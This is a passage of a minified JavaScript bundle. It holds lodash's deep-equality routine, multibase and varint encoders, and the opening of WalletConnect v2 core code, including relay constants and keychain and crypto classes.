0:e.message)||`WebSocket connection failed for host: ${bx(this.url)}`));return this.events.emit("register_error",t),t}}var Fg={exports:{}};Fg.exports,function(e,t){var r="__lodash_hash_undefined__",n=1,i=2,o=9007199254740991,s="[object Arguments]",a="[object Array]",c="[object AsyncFunction]",l="[object Boolean]",u="[object Date]",h="[object Error]",d="[object Function]",f="[object GeneratorFunction]",p="[object Map]",g="[object Number]",m="[object Null]",v="[object Object]",y="[object Promise]",b="[object Proxy]",w="[object RegExp]",_="[object Set]",E="[object String]",x="[object Symbol]",S="[object Undefined]",A="[object WeakMap]",C="[object ArrayBuffer]",I="[object DataView]",k=/^\[object .+?Constructor\]$/,N=/^(?:0|[1-9]\d*)$/,R={};R["[object Float32Array]"]=R["[object Float64Array]"]=R["[object Int8Array]"]=R["[object Int16Array]"]=R["[object Int32Array]"]=R["[object Uint8Array]"]=R["[object Uint8ClampedArray]"]=R["[object Uint16Array]"]=R["[object Uint32Array]"]=!0,R[s]=R[a]=R[C]=R[l]=R[I]=R[u]=R[h]=R[d]=R[p]=R[g]=R[v]=R[w]=R[_]=R[E]=R[A]=!1;var T="object"==typeof Ue&&Ue&&Ue.Object===Object&&Ue,O="object"==typeof self&&self&&self.Object===Object&&self,P=T||O||Function("return this")(),M=t&&!t.nodeType&&t,j=M&&e&&!e.nodeType&&e,L=j&&j.exports===M,D=L&&T.process,B=function(){try{return D&&D.binding&&D.binding("util")}catch{}}(),U=B&&B.isTypedArray;function $(e,t){for(var r=-1,n=null==e?0:e.length;++r<n;)if(t(e[r],r,e))return!0;return!1}function z(e,t){return e.has(t)}function F(e){var t=-1,r=Array(e.size);return e.forEach((function(e,n){r[++t]=[n,e]})),r}function H(e){var t=-1,r=Array(e.size);return e.forEach((function(e){r[++t]=e})),r}var q,W=Array.prototype,V=Function.prototype,G=Object.prototype,K=P["__core-js_shared__"],Z=V.toString,Y=G.hasOwnProperty,J=(q=/[^.]+$/.exec(K&&K.keys&&K.keys.IE_PROTO||""))?"Symbol(src)_1."+q:"",Q=G.toString,X=RegExp("^"+Z.call(Y).replace(/[\\^$.*+?()[\]{}|]/g,"\\$&").replace(/hasOwnProperty|(function).*?(?=\\\()| for .+?(?=\\\])/g,"$1.*?")+"$"),ee=L?P.Buffer:void 0,te=P.Symbol,re=P.Uint8Array,ne=G.propertyIsEnumerable,ie=W.splice,oe=te?te.toStringTag:void 0,se=Object.getOwnPropertySymbols,ae=ee?ee.isBuffer:void 0,ce=function(e,t){return function(r){return e(t(r))}}(Object.keys,Object),le=De(P,"DataView"),ue=De(P,"Map"),he=De(P,"Promise"),de=De(P,"Set"),fe=De(P,"WeakMap"),pe=De(Object,"create"),ge=Fe(le),me=Fe(ue),ve=Fe(he),ye=Fe(de),be=Fe(fe),we=te?te.prototype:void 0,_e=we?we.valueOf:void 0;function Ee(e){var t=-1,r=null==e?0:e.length;for(this.clear();++t<r;){var n=e[t];this.set(n[0],n[1])}}function xe(e){var t=-1,r=null==e?0:e.length;for(this.clear();++t<r;){var n=e[t];this.set(n[0],n[1])}}function Se(e){var t=-1,r=null==e?0:e.length;for(this.clear();++t<r;){var n=e[t];this.set(n[0],n[1])}}function Ae(e){var t=-1,r=null==e?0:e.length;for(this.__data__=new Se;++t<r;)this.add(e[t])}function Ce(e){var t=this.__data__=new xe(e);this.size=t.size}function Ie(e,t){var r=We(e),n=!r&&qe(e),i=!r&&!n&&Ve(e),o=!r&&!n&&!i&&Je(e),s=r||n||i||o,a=s?function(e,t){for(var r=-1,n=Array(e);++r<e;)n[r]=t(r);return n}(e.length,String):[],c=a.length;for(var l in e)(t||Y.call(e,l))&&(!s||!("length"==l||i&&("offset"==l||"parent"==l)||o&&("buffer"==l||"byteLength"==l||"byteOffset"==l)||ze(l,c)))&&a.push(l);return a}function ke(e,t){for(var r=e.length;r--;)if(He(e[r][0],t))return r;return-1}function Ne(e){return null==e?void 0===e?S:m:oe&&oe in Object(e)?function(e){var t=Y.call(e,oe),r=e[oe];try{e[oe]=void 0;var n=!0}catch{}var i=Q.call(e);return n&&(t?e[oe]=r:delete e[oe]),i}(e):function(e){return Q.call(e)}(e)}function Re(e){return Ye(e)&&Ne(e)==s}function Te(e,t,r,o,c){return e===t||(null==e||null==t||!Ye(e)&&!Ye(t)?e!=e&&t!=t:function(e,t,r,o,c,d){var f=We(e),m=We(t),y=f?a:$e(e),b=m?a:$e(t),S=(y=y==s?v:y)==v,A=(b=b==s?v:b)==v,k=y==b;if(k&&Ve(e)){if(!Ve(t))return!1;f=!0,S=!1}if(k&&!S)return d||(d=new Ce),f||Je(e)?Me(e,t,r,o,c,d):function(e,t,r,o,s,a,c){switch(r){case I:if(e.byteLength!=t.byteLength||e.byteOffset!=t.byteOffset)return!1;e=e.buffer,t=t.buffer;case C:return!(e.byteLength!=t.byteLength||!a(new re(e),new re(t)));case l:case u:case g:return He(+e,+t);case h:return e.name==t.name&&e.message==t.message;case w:case E:return e==t+"";case p:var d=F;case _:var f=o&n;if(d||(d=H),e.size!=t.size&&!f)return!1;var m=c.get(e);if(m)return m==t;o|=i,c.set(e,t);var v=Me(d(e),d(t),o,s,a,c);return c.delete(e),v;case x:if(_e)return _e.call(e)==_e.call(t)}return!1}(e,t,y,r,o,c,d);if(!(r&n)){var N=S&&Y.call(e,"__wrapped__"),R=A&&Y.call(t,"__wrapped__");if(N||R){var T=N?e.value():e,O=R?t.value():t;return d||(d=new Ce),c(T,O,r,o,d)}}return!!k&&(d||(d=new Ce),function(e,t,r,i,o,s){var a=r&n,c=je(e),l=c.length,u=je(t),h=u.length;if(l!=h&&!a)return!1;for(var d=l;d--;){var f=c[d];if(!(a?f in t:Y.call(t,f)))return!1}var p=s.get(e);if(p&&s.get(t))return p==t;var g=!0;s.set(e,t),s.set(t,e);for(var m=a;++d<l;){var v=e[f=c[d]],y=t[f];if(i)var b=a?i(y,v,f,t,e,s):i(v,y,f,e,t,s);if(!(void 0===b?v===y||o(v,y,r,i,s):b)){g=!1;break}m||(m="constructor"==f)}if(g&&!m){var w=e.constructor,_=t.constructor;w!=_&&"constructor"in e&&"constructor"in t&&!("function"==typeof w&&w instanceof w&&"function"==typeof _&&_ instanceof _)&&(g=!1)}return s.delete(e),s.delete(t),g}(e,t,r,o,c,d))}(e,t,r,o,Te,c))}function Oe(e){return!(!Ze(e)||function(e){return!!J&&J in e}(e))&&(Ge(e)?X:k).test(Fe(e))}function Pe(e){if(!function(e){var t=e&&e.constructor,r="function"==typeof t&&t.prototype||G;return e===r}(e))return ce(e);var t=[];for(var r in Object(e))Y.call(e,r)&&"constructor"!=r&&t.push(r);return t}function Me(e,t,r,o,s,a){var c=r&n,l=e.length,u=t.length;if(l!=u&&!(c&&u>l))return!1;var h=a.get(e);if(h&&a.get(t))return h==t;var d=-1,f=!0,p=r&i?new Ae:void 0;for(a.set(e,t),a.set(t,e);++d<l;){var g=e[d],m=t[d];if(o)var v=c?o(m,g,d,t,e,a):o(g,m,d,e,t,a);if(void 0!==v){if(v)continue;f=!1;break}if(p){if(!$(t,(function(e,t){if(!z(p,t)&&(g===e||s(g,e,r,o,a)))return p.push(t)}))){f=!1;break}}else if(g!==m&&!s(g,m,r,o,a)){f=!1;break}}return a.delete(e),a.delete(t),f}function je(e){return function(e,t,r){var n=t(e);return We(e)?n:function(e,t){for(var r=-1,n=t.length,i=e.length;++r<n;)e[i+r]=t[r];return e}(n,r(e))}(e,Qe,Be)}function Le(e,t){var r=e.__data__;return function(e){var t=typeof e;return"string"==t||"number"==t||"symbol"==t||"boolean"==t?"__proto__"!==e:null===e}(t)?r["string"==typeof t?"string":"hash"]:r.map}function De(e,t){var r=function(e,t){return null==e?void 0:e[t]}(e,t);return Oe(r)?r:void 0}Ee.prototype.clear=function(){this.__data__=pe?pe(null):{},this.size=0},Ee.prototype.delete=function(e){var t=this.has(e)&&delete this.__data__[e];return this.size-=t?1:0,t},Ee.prototype.get=function(e){var t=this.__data__;if(pe){var n=t[e];return n===r?void 0:n}return Y.call(t,e)?t[e]:void 0},Ee.prototype.has=function(e){var t=this.__data__;return pe?void 0!==t[e]:Y.call(t,e)},Ee.prototype.set=function(e,t){var n=this.__data__;return this.size+=this.has(e)?0:1,n[e]=pe&&void 0===t?r:t,this},xe.prototype.clear=function(){this.__data__=[],this.size=0},xe.prototype.delete=function(e){var t=this.__data__,r=ke(t,e);return!(r<0)&&(r==t.length-1?t.pop():ie.call(t,r,1),--this.size,!0)},xe.prototype.get=function(e){var t=this.__data__,r=ke(t,e);return r<0?void 0:t[r][1]},xe.prototype.has=function(e){return ke(this.__data__,e)>-1},xe.prototype.set=function(e,t){var r=this.__data__,n=ke(r,e);return n<0?(++this.size,r.push([e,t])):r[n][1]=t,this},Se.prototype.clear=function(){this.size=0,this.__data__={hash:new Ee,map:new(ue||xe),string:new Ee}},Se.prototype.delete=function(e){var t=Le(this,e).delete(e);return this.size-=t?1:0,t},Se.prototype.get=function(e){return Le(this,e).get(e)},Se.prototype.has=function(e){return Le(this,e).has(e)},Se.prototype.set=function(e,t){var r=Le(this,e),n=r.size;return r.set(e,t),this.size+=r.size==n?0:1,this},Ae.prototype.add=Ae.prototype.push=function(e){return this.__data__.set(e,r),this},Ae.prototype.has=function(e){return this.__data__.has(e)},Ce.prototype.clear=function(){this.__data__=new xe,this.size=0},Ce.prototype.delete=function(e){var t=this.__data__,r=t.delete(e);return this.size=t.size,r},Ce.prototype.get=function(e){return this.__data__.get(e)},Ce.prototype.has=function(e){return this.__data__.has(e)},Ce.prototype.set=function(e,t){var r=this.__data__;if(r instanceof xe){var n=r.__data__;if(!ue||n.length<199)return n.push([e,t]),this.size=++r.size,this;r=this.__data__=new Se(n)}return r.set(e,t),this.size=r.size,this};var Be=se?function(e){return null==e?[]:(e=Object(e),function(e,t){for(var r=-1,n=null==e?0:e.length,i=0,o=[];++r<n;){var s=e[r];t(s,r,e)&&(o[i++]=s)}return o}(se(e),(function(t){return ne.call(e,t)})))}:function(){return[]},$e=Ne;function ze(e,t){return!!(t=t??o)&&("number"==typeof e||N.test(e))&&e>-1&&e%1==0&&e<t}function Fe(e){if(null!=e){try{return Z.call(e)}catch{}try{return e+""}catch{}}return""}function He(e,t){return e===t||e!=e&&t!=t}(le&&$e(new le(new ArrayBuffer(1)))!=I||ue&&$e(new ue)!=p||he&&$e(he.resolve())!=y||de&&$e(new de)!=_||fe&&$e(new fe)!=A)&&($e=function(e){var t=Ne(e),r=t==v?e.constructor:void 0,n=r?Fe(r):"";if(n)switch(n){case ge:return I;case me:return p;case ve:return y;case ye:return _;case be:return A}return t});var qe=Re(function(){return arguments}())?Re:function(e){return Ye(e)&&Y.call(e,"callee")&&!ne.call(e,"callee")},We=Array.isArray;var Ve=ae||function(){return!1};function Ge(e){if(!Ze(e))return!1;var t=Ne(e);return t==d||t==f||t==c||t==b}function Ke(e){return"number"==typeof e&&e>-1&&e%1==0&&e<=o}function Ze(e){var t=typeof e;return null!=e&&("object"==t||"function"==t)}function Ye(e){return null!=e&&"object"==typeof e}var Je=U?function(e){return function(t){return e(t)}}(U):function(e){return Ye(e)&&Ke(e.length)&&!!R[Ne(e)]};function Qe(e){return function(e){return null!=e&&Ke(e.length)&&!Ge(e)}(e)?Ie(e):Pe(e)}e.exports=function(e,t){return Te(e,t)}}(Fg,Fg.exports);var NK=Fg.exports;const OK=tu(NK);function PK(e,t){if(e.length>=255)throw new TypeError("Alphabet too long");for(var r=new Uint8Array(256),n=0;n<r.length;n++)r[n]=255;for(var i=0;i<e.length;i++){var o=e.charAt(i),s=o.charCodeAt(0);if(255!==r[s])throw new TypeError(o+" is ambiguous");r[s]=i}var a=e.length,c=e.charAt(0),l=Math.log(a)/Math.log(256),u=Math.log(256)/Math.log(a);function h(e){if("string"!=typeof e)throw new TypeError("Expected String");if(0===e.length)return new Uint8Array;var t=0;if(" "!==e[t]){for(var n=0,i=0;e[t]===c;)n++,t++;for(var o=(e.length-t)*l+1>>>0,s=new Uint8Array(o);e[t];){var u=r[e.charCodeAt(t)];if(255===u)return;for(var h=0,d=o-1;(0!==u||h<i)&&-1!==d;d--,h++)u+=a*s[d]>>>0,s[d]=u%256>>>0,u=u/256>>>0;if(0!==u)throw new Error("Non-zero carry");i=h,t++}if(" "!==e[t]){for(var f=o-i;f!==o&&0===s[f];)f++;for(var p=new Uint8Array(n+(o-f)),g=n;f!==o;)p[g++]=s[f++];return p}}}return{encode:function(t){if(t instanceof Uint8Array||(ArrayBuffer.isView(t)?t=new Uint8Array(t.buffer,t.byteOffset,t.byteLength):Array.isArray(t)&&(t=Uint8Array.from(t))),!(t instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(0===t.length)return"";for(var r=0,n=0,i=0,o=t.length;i!==o&&0===t[i];)i++,r++;for(var s=(o-i)*u+1>>>0,l=new Uint8Array(s);i!==o;){for(var h=t[i],d=0,f=s-1;(0!==h||d<n)&&-1!==f;f--,d++)h+=256*l[f]>>>0,l[f]=h%a>>>0,h=h/a>>>0;if(0!==h)throw new Error("Non-zero carry");n=d,i++}for(var p=s-n;p!==s&&0===l[p];)p++;for(var g=c.repeat(r);p<s;++p)g+=e.charAt(l[p]);return g},decodeUnsafe:h,decode:function(e){var r=h(e);if(r)return r;throw new Error(`Non-${t} character`)}}}var MK=PK,kK=MK;const _I=e=>{if(e instanceof Uint8Array&&"Uint8Array"===e.constructor.name)return e;if(e instanceof ArrayBuffer)return new Uint8Array(e);if(ArrayBuffer.isView(e))return new Uint8Array(e.buffer,e.byteOffset,e.byteLength);throw new Error("Unknown type, must be binary type")},DK=e=>(new TextEncoder).encode(e),$K=e=>(new TextDecoder).decode(e);class LK{constructor(e,t,r){this.name=e,this.prefix=t,this.baseEncode=r}encode(e){if(e instanceof Uint8Array)return`${this.prefix}${this.baseEncode(e)}`;throw Error("Unknown type, must be binary type")}}class BK{constructor(e,t,r){if(this.name=e,this.prefix=t,void 0===t.codePointAt(0))throw new Error("Invalid prefix character");this.prefixCodePoint=t.codePointAt(0),this.baseDecode=r}decode(e){if("string"==typeof e){if(e.codePointAt(0)!==this.prefixCodePoint)throw Error(`Unable to decode multibase string ${JSON.stringify(e)}, ${this.name} decoder only supports inputs prefixed with ${this.prefix}`);return this.baseDecode(e.slice(this.prefix.length))}throw Error("Can only multibase decode strings")}or(e){return EI(this,e)}}class FK{constructor(e){this.decoders=e}or(e){return EI(this,e)}decode(e){const t=e[0],r=this.decoders[t];if(r)return r.decode(e);throw RangeError(`Unable to decode multibase string ${JSON.stringify(e)}, only inputs prefixed with ${Object.keys(this.decoders)} are supported`)}}const EI=(e,t)=>new FK({...e.decoders||{[e.prefix]:e},...t.decoders||{[t.prefix]:t}});class jK{constructor(e,t,r,n){this.name=e,this.prefix=t,this.baseEncode=r,this.baseDecode=n,this.encoder=new LK(e,t,r),this.decoder=new BK(e,t,n)}encode(e){return this.encoder.encode(e)}decode(e){return this.decoder.decode(e)}}const $v=({name:e,prefix:t,encode:r,decode:n})=>new jK(e,t,r,n),B0=({prefix:e,name:t,alphabet:r})=>{const{encode:n,decode:i}=kK(r,t);return $v({prefix:e,name:t,encode:n,decode:e=>_I(i(e))})},UK=(e,t,r,n)=>{const i={};for(let e=0;e<t.length;++e)i[t[e]]=e;let o=e.length;for(;"="===e[o-1];)--o;const s=new Uint8Array(o*r/8|0);let a=0,c=0,l=0;for(let t=0;t<o;++t){const o=i[e[t]];if(void 0===o)throw new SyntaxError(`Non-${n} character`);c=c<<r|o,a+=r,a>=8&&(a-=8,s[l++]=255&c>>a)}if(a>=r||255&c<<8-a)throw new SyntaxError("Unexpected end of data");return s},WK=(e,t,r)=>{const n="="===t[t.length-1],i=(1<<r)-1;let o="",s=0,a=0;for(let n=0;n<e.length;++n)for(a=a<<8|e[n],s+=8;s>r;)s-=r,o+=t[i&a>>s];if(s&&(o+=t[i&a<<r-s]),n)for(;o.length*r&7;)o+="=";return o},Hn=({name:e,prefix:t,bitsPerChar:r,alphabet:n})=>$v({prefix:t,name:e,encode:e=>WK(e,n,r),decode:t=>UK(t,n,r,e)}),zK=$v({prefix:"\0",name:"identity",encode:e=>$K(e),decode:e=>DK(e)});var HK=Object.freeze({__proto__:null,identity:zK});const qK=Hn({prefix:"0",name:"base2",alphabet:"01",bitsPerChar:1});var VK=Object.freeze({__proto__:null,base2:qK});const GK=Hn({prefix:"7",name:"base8",alphabet:"01234567",bitsPerChar:3});var KK=Object.freeze({__proto__:null,base8:GK});const JK=B0({prefix:"9",name:"base10",alphabet:"0123456789"});var ZK=Object.freeze({__proto__:null,base10:JK});const QK=Hn({prefix:"f",name:"base16",alphabet:"0123456789abcdef",bitsPerChar:4}),YK=Hn({prefix:"F",name:"base16upper",alphabet:"0123456789ABCDEF",bitsPerChar:4});var XK=Object.freeze({__proto__:null,base16:QK,base16upper:YK});const eJ=Hn({prefix:"b",name:"base32",alphabet:"abcdefghijklmnopqrstuvwxyz234567",bitsPerChar:5}),tJ=Hn({prefix:"B",name:"base32upper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567",bitsPerChar:5}),rJ=Hn({prefix:"c",name:"base32pad",alphabet:"abcdefghijklmnopqrstuvwxyz234567=",bitsPerChar:5}),nJ=Hn({prefix:"C",name:"base32padupper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=",bitsPerChar:5}),iJ=Hn({prefix:"v",name:"base32hex",alphabet:"0123456789abcdefghijklmnopqrstuv",bitsPerChar:5}),sJ=Hn({prefix:"V",name:"base32hexupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV",bitsPerChar:5}),oJ=Hn({prefix:"t",name:"base32hexpad",alphabet:"0123456789abcdefghijklmnopqrstuv=",bitsPerChar:5}),aJ=Hn({prefix:"T",name:"base32hexpadupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV=",bitsPerChar:5}),cJ=Hn({prefix:"h",name:"base32z",alphabet:"ybndrfg8ejkmcpqxot1uwisza345h769",bitsPerChar:5});var lJ=Object.freeze({__proto__:null,base32:eJ,base32upper:tJ,base32pad:rJ,base32padupper:nJ,base32hex:iJ,base32hexupper:sJ,base32hexpad:oJ,base32hexpadupper:aJ,base32z:cJ});const uJ=B0({prefix:"k",name:"base36",alphabet:"0123456789abcdefghijklmnopqrstuvwxyz"}),fJ=B0({prefix:"K",name:"base36upper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"});var hJ=Object.freeze({__proto__:null,base36:uJ,base36upper:fJ});const dJ=B0({name:"base58btc",prefix:"z",alphabet:"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"}),pJ=B0({name:"base58flickr",prefix:"Z",alphabet:"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ"});var gJ=Object.freeze({__proto__:null,base58btc:dJ,base58flickr:pJ});const vJ=Hn({prefix:"m",name:"base64",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",bitsPerChar:6}),mJ=Hn({prefix:"M",name:"base64pad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",bitsPerChar:6}),bJ=Hn({prefix:"u",name:"base64url",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_",bitsPerChar:6}),wJ=Hn({prefix:"U",name:"base64urlpad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=",bitsPerChar:6});var yJ=Object.freeze({__proto__:null,base64:vJ,base64pad:mJ,base64url:bJ,base64urlpad:wJ});const xI=Array.from("🚀🪐☄🛰🌌🌑🌒🌓🌔🌕🌖🌗🌘🌍🌏🌎🐉☀💻🖥💾💿😂❤😍🤣😊🙏💕😭😘👍😅👏😁🔥🥰💔💖💙😢🤔😆🙄💪😉☺👌🤗💜😔😎😇🌹🤦🎉💞✌✨🤷😱😌🌸🙌😋💗💚😏💛🙂💓🤩😄😀🖤😃💯🙈👇🎶😒🤭❣😜💋👀😪😑💥🙋😞😩😡🤪👊🥳😥🤤👉💃😳✋😚😝😴🌟😬🙃🍀🌷😻😓⭐✅🥺🌈😈🤘💦✔😣🏃💐☹🎊💘😠☝😕🌺🎂🌻😐🖕💝🙊😹🗣💫💀👑🎵🤞😛🔴😤🌼😫⚽🤙☕🏆🤫👈😮🙆🍻🍃🐶💁😲🌿🧡🎁⚡🌞🎈❌✊👋😰🤨😶🤝🚶💰🍓💢🤟🙁🚨💨🤬✈🎀🍺🤓😙💟🌱😖👶🥴▶➡❓💎💸⬇😨🌚🦋😷🕺⚠🙅😟😵👎🤲🤠🤧📌🔵💅🧐🐾🍒😗🤑🌊🤯🐷☎💧😯💆👆🎤🙇🍑❄🌴💣🐸💌📍🥀🤢👅💡💩👐📸👻🤐🤮🎼🥵🚩🍎🍊👼💍📣🥂"),_J=xI.reduce(((e,t,r)=>(e[r]=t,e)),[]),EJ=xI.reduce(((e,t,r)=>(e[t.codePointAt(0)]=r,e)),[]);function xJ(e){return e.reduce(((e,t)=>e+=_J[t]),"")}function SJ(e){const t=[];for(const r of e){const e=EJ[r.codePointAt(0)];if(void 0===e)throw new Error(`Non-base256emoji character: ${r}`);t.push(e)}return new Uint8Array(t)}const CJ=$v({prefix:"🚀",name:"base256emoji",encode:xJ,decode:SJ});var AJ=Object.freeze({__proto__:null,base256emoji:CJ}),IJ=SI,yx=128,RJ=127,TJ=~RJ,NJ=Math.pow(2,31);function SI(e,t,r){t=t||[];for(var n=r=r||0;e>=NJ;)t[r++]=255&e|yx,e/=128;for(;e&TJ;)t[r++]=255&e|yx,e>>>=7;return t[r]=0|e,SI.bytes=r-n+1,t}var OJ=R2,PJ=128,_x=127;function R2(e,t){var r,n=0,i=0,o=t=t||0,s=e.length;do{if(o>=s)throw R2.bytes=0,new RangeError("Could not decode varint");r=e[o++],n+=i<28?(r&_x)<<i:(r&_x)*Math.pow(2,i),i+=7}while(r>=PJ);return R2.bytes=o-t,n}var MJ=Math.pow(2,7),kJ=Math.pow(2,14),DJ=Math.pow(2,21),$J=Math.pow(2,28),LJ=Math.pow(2,35),BJ=Math.pow(2,42),FJ=Math.pow(2,49),jJ=Math.pow(2,56),UJ=Math.pow(2,63),WJ=function(e){return e<MJ?1:e<kJ?2:e<DJ?3:e<$J?4:e<LJ?5:e<BJ?6:e<FJ?7:e<jJ?8:e<UJ?9:10},zJ={encode:IJ,decode:OJ,encodingLength:WJ},CI=zJ;const Ex=(e,t,r=0)=>(CI.encode(e,t,r),t),xx=e=>CI.encodingLength(e),T2=(e,t)=>{const r=t.byteLength,n=xx(e),i=n+xx(r),o=new Uint8Array(i+r);return Ex(e,o,0),Ex(r,o,n),o.set(t,i),new HJ(e,r,t,o)};class HJ{constructor(e,t,r,n){this.code=e,this.size=t,this.digest=r,this.bytes=n}}const AI=({name:e,code:t,encode:r})=>new qJ(e,t,r);class qJ{constructor(e,t,r){this.name=e,this.code=t,this.encode=r}digest(e){if(e instanceof Uint8Array){const t=this.encode(e);return t instanceof Uint8Array?T2(this.code,t):t.then((e=>T2(this.code,e)))}throw Error("Unknown type, must be binary type")}}const II=e=>async t=>new Uint8Array(await crypto.subtle.digest(e,t)),VJ=AI({name:"sha2-256",code:18,encode:II("SHA-256")}),GJ=AI({name:"sha2-512",code:19,encode:II("SHA-512")});var KJ=Object.freeze({__proto__:null,sha256:VJ,sha512:GJ});const RI=0,JJ="identity",TI=_I,ZJ=e=>T2(0,TI(e)),QJ={code:0,name:JJ,encode:TI,digest:ZJ};var YJ=Object.freeze({__proto__:null,identity:QJ});new TextEncoder,new TextDecoder;const Sx={...HK,...VK,...KK,...ZK,...XK,...lJ,...hJ,...gJ,...yJ,...AJ};function NI(e){return null!=globalThis.Buffer?new Uint8Array(e.buffer,e.byteOffset,e.byteLength):e}function XJ(e=0){return null!=globalThis.Buffer&&null!=globalThis.Buffer.allocUnsafe?NI(globalThis.Buffer.allocUnsafe(e)):new Uint8Array(e)}function OI(e,t,r,n){return{name:e,prefix:t,encoder:{name:e,prefix:t,encode:r},decoder:{decode:n}}}const Cx=OI("utf8","u",(e=>"u"+new TextDecoder("utf8").decode(e)),(e=>(new TextEncoder).encode(e.substring(1)))),kw=OI("ascii","a",(e=>{let t="a";for(let r=0;r<e.length;r++)t+=String.fromCharCode(e[r]);return t}),(e=>{const t=XJ((e=e.substring(1)).length);for(let r=0;r<e.length;r++)t[r]=e.charCodeAt(r);return t})),eZ={utf8:Cx,"utf-8":Cx,hex:Sx.base16,latin1:kw,ascii:kw,binary:kw,...Sx};function tZ(e,t="utf8"){const r=eZ[t];if(!r)throw new Error(`Unsupported encoding "${t}"`);return"utf8"!==t&&"utf-8"!==t||null==globalThis.Buffer||null==globalThis.Buffer.from?r.decoder.decode(`${r.prefix}${e}`):NI(globalThis.Buffer.from(e,"utf-8"))}const PI="wc",rZ=2,i_="core",Dc=`${PI}@2:${i_}:`,nZ={name:i_,logger:"error"},iZ={database:":memory:"},sZ="crypto",Ax="client_ed25519_seed",oZ=rt.ONE_DAY,aZ="keychain",cZ="0.3",lZ="messages",uZ="0.3",fZ=rt.SIX_HOURS,hZ="publisher",MI="irn",dZ="error",kI="wss://relay.walletconnect.com",Ix="wss://relay.walletconnect.org",pZ="relayer",ni={message:"relayer_message",message_ack:"relayer_message_ack",connect:"relayer_connect",disconnect:"relayer_disconnect",error:"relayer_error",connection_stalled:"relayer_connection_stalled",transport_closed:"relayer_transport_closed",publish:"relayer_publish"},gZ="_subscription",Ca={payload:"payload",connect:"connect",disconnect:"disconnect",error:"error"},vZ=rt.ONE_SECOND,mZ="2.10.2",bZ=1e4,wZ="0.3",yZ="WALLETCONNECT_CLIENT_ID",co={created:"subscription_created",deleted:"subscription_deleted",expired:"subscription_expired",disabled:"subscription_disabled",sync:"subscription_sync",resubscribed:"subscription_resubscribed"},_Z="subscription",EZ="0.3",xZ=1e3*rt.FIVE_SECONDS,SZ="pairing",CZ="0.3",td={wc_pairingDelete:{req:{ttl:rt.ONE_DAY,prompt:!1,tag:1e3},res:{ttl:rt.ONE_DAY,prompt:!1,tag:1001}},wc_pairingPing:{req:{ttl:rt.THIRTY_SECONDS,prompt:!1,tag:1002},res:{ttl:rt.THIRTY_SECONDS,prompt:!1,tag:1003}},unregistered_method:{req:{ttl:rt.ONE_DAY,prompt:!1,tag:0},res:{ttl:rt.ONE_DAY,prompt:!1,tag:0}}},_d={create:"pairing_create",expire:"pairing_expire",delete:"pairing_delete",ping:"pairing_ping"},No={created:"history_created",updated:"history_updated",deleted:"history_deleted",sync:"history_sync"},AZ="history",IZ="0.3",RZ="expirer",Rs={created:"expirer_created",deleted:"expirer_deleted",expired:"expirer_expired",sync:"expirer_sync"},TZ="0.3",Dw="verify-api",Y1="https://verify.walletconnect.com",Rx="https://verify.walletconnect.org";class NZ{constructor(e,t){this.core=e,this.logger=t,this.keychain=new Map,this.name=aZ,this.version=cZ,this.initialized=!1,this.storagePrefix=Dc,this.init=async()=>{if(!this.initialized){const e=await this.getKeyChain();typeof e<"u"&&(this.keychain=e),this.initialized=!0}},this.has=e=>(this.isInitialized(),this.keychain.has(e)),this.set=async(e,t)=>{this.isInitialized(),this.keychain.set(e,t),await this.persist()},this.get=e=>{this.isInitialized();const t=this.keychain.get(e);if(typeof t>"u"){const{message:t}=je("NO_MATCHING_KEY",`${this.name}: ${e}`);throw new Error(t)}return t},this.del=async e=>{this.isInitialized(),this.keychain.delete(e),await this.persist()},this.core=e,this.logger=nr.generateChildLogger(t,this.name)}get context(){return nr.getLoggerContext(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}async setKeyChain(e){await this.core.storage.setItem(this.storageKey,X9(e))}async getKeyChain(){const e=await this.core.storage.getItem(this.storageKey);return typeof e<"u"?eI(e):void 0}async persist(){await this.setKeyChain(this.keychain)}isInitialized(){if(!this.initialized){const{message:e}=je("NOT_INITIALIZED",this.name);throw new Error(e)}}}class OZ{constructor(e,t,r){this.core=e,this.logger=t,this.name=sZ,this.initialized=!1,this.init=async()=>{this.initialized||(await this.keychain.init(),this.initialized=!0)},this.hasKeys=e=>(this.isInitialized(),this.keychain.has(e)),this.getClientId=async()=>{this.isInitialized();return dI(hx(await this.getClientSeed()).publicKey)},this.generateKeyPair=()=>{this.isInitialized();const e=Fq();return this.setPrivateKey(e.publicKey,e.privateKey)},this.signJWT=async e=>{this.isInitialized();const t=hx(await this.getClientSeed()),r=C2();return await cK(r,e,oZ,t)},this.generateSharedKey=(e,t,r)=>{this.isInitialized();const n=jq(this.getPrivateKey(e),t);return this.setSymKey(n,r)},this.setSymKey=async(e,t)=>{this.isInitialized();const r=t||Uq(e);return await this.keychain.set(r,e),r},this.deleteKeyPair=async e=>{this.isInitialized(),await this.keychain.del(e)},this.deleteSymKey=async e=>{this.isInitialized(),await this.keychain.del(e)},this.encode=async(e,t,r)=>{this.isInitialized();const n=Y9(r),i=ql(t);if(UE(n)){const t=n.senderPublicKey,r=n.receiverPublicKey;e=await this.generateSharedKey(t,r)}const o=this.getSymKey(e),{type:s,senderPublicKey:a}=n;return zq({type:s,symKey:o,message:i,senderPublicKey:a})},this.decode=async(e,t,r)=>{this.isInitialized();const n=Vq(t,r);if(UE(n)){const t=n.receiverPublicKey,r=n.senderPublicKey;e=await this.generateSharedKey(t,r)}try{const r=this.getSymKey(e);return L0(Hq({symKey:r,encoded:t}))}catch(t){this.logger.error(`Failed to decode message from topic: '${e}', clientId: '${await 